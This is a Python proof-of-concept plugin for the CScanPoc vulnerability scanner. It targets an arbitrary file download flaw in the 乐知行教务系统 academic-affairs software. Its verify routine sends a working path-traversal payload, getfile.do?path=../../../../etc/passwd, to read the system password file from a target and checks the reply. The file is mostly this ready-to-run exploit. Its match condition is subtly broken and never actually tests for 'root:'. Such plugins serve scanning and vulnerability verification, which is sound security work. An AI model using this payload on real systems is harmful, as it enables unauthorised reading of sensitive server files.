# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'c48b5f5b-dc5b-43c1-a3a7-24a0e786ace7'
    name = '北京乐知行教务系统任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
        北京乐知行教务系统任意文件下载漏洞： /datacenter/getfile.do?path=../../../../../../../../../../etc/passwd
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '乐知行教务系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a1d68bd5-89d6-4c7e-8c9d-dc46f8a31cb4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref http://www.wooyun.org/bugs/wooyun-2014-085320
            payload = '/datacenter/getfile.do?path=../../../../../../../../../../etc/passwd'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if 'root:' and '/bin:/sbin' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
